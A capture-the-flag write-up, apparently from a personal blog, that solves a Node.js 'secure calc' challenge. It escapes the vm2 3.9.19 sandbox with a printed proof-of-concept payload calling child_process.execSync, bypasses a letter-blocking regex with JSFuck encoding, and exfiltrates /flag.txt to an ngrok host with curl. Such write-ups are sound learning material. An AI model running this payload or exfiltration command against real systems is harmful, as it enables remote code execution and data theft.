---
title: "Web: secure calc"
date: "2024-08-03"
tags:
    - CVE
    - regex
thumbnail: "/assets/img/thumbnail/ascwgs24.png"
---


# Description
---
This site is secure and sandboxed.

# Solution
---
When we start the challange we will find the source code which is a NodeJS express site and it's a small app as you see
```js
const express = require("express");
const {VM} = require("vm2");

const app = express();
const vm = new VM();

app.use(express.json());



app.get('/', function (req, res) {
    return res.send("Hello, just index : )");
});

app.post('/calc',async function (req, res) {
    let { eqn } = req.body;
    if (!eqn) {
        return res.status(400).json({ 'Error': 'Please provide the equation' });
    } 
    else if (eqn.match(/[a-zA-Z]/)) {
        return res.status(400).json({ 'Error': 'Invalid Format' });
    }

    try {
        result = await vm.run(eqn);
        res.send(200,result);
    } catch (e) {
        console.log(e);
        return res.status(400).json({ 'Error': 'Syntax error, please check your equation' });
    }
});



app.listen(3000,'0.0.0.0',function(){
    console.log("Started !")
});
```

We see `const {VM} = require("vm2");`, I searched for it and i knew the version from `package.json` file attached ith the challange and the version was `"vm2": "^3.9.19"`.
It's vulnerable to sandbox escaping and the poc is in this <a href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">article</a>. We see that the code executed is passed to `vm.run(code)` function and we have this function in the code of the challange.

When we examine `/calc` endpoint we see that it's an endpoint for solving equations and we will find 4 steps:
- checking if there's a data in the request body (this data will be in json format)
- data is passed to regex checker to make sure that the data in the request body doesn't contain any characters
- `vm.run(code)` at which the equation will be solved or our code will be executed and it's our goal
- syntax error if there is any error from `vm.run(code)`

I have the CVE POC code so i can escape the sandbox but the problem is in bypassing regex.

When i send a normal data without any alphabetical characters i get the result of the equation like this
<img src="/assets/img/ascwgs/eqn.png">

When i try sending any characters i get `"Error":"Invalid Format"`
after many attempts i got an error in the syntax that told me json.parse is used
<img src="/assets/img/ascwgs/parse.png">

This made me to think about `prototype pollution`
I tried
```
{
    "__proto__": {
        "eqn": "1+2"
    }
}
```
but it couldn't detect that it's an equation.
I tried many encoding algorithms like unicode but didn't work.
After many attempts i found the suitable encoding way it's `JSFuck` because it consists of symbols only so it will work

I used this payload
```js
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('curl http://ngrokIP:ngrokport'); }
            )
        }
    }
};
p.then();
```
and converted it to JSFuck using any online <a href="https://jsfuck.com/">converter</a> and send that request
<img src="/assets/img/ascwgs/curl.png">
The curl command worked well
<img src="/assets/img/ascwgs/curl.png">
Now let's read the flag but making the command to be
```
curl -X POST --data-binary "@/flag.txt" http://ngrokIP:port
```

convert it and send the request like we did before AND ..
<img src="/assets/img/ascwgs/flag2.png">
GG !!